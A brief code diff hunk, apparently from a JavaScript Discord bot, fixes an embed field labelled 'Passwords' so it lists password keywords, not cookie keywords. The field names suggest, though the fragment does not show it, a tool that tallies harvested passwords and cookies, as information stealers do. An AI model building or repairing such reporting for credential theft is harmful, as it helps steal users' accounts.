@@ -3443,7 +3443,7 @@
                   fields: [
                     {
                       name: `Passwords`,
-                      value: `\`\`\`${client.config.counter.keywords_cookies.join(", ") || "None"}\`\`\``,
+                      value: `\`\`\`${client.config.counter.keywords_passwords.join(", ") || "None"}\`\`\``,
                       inline: false
                     },
                     {
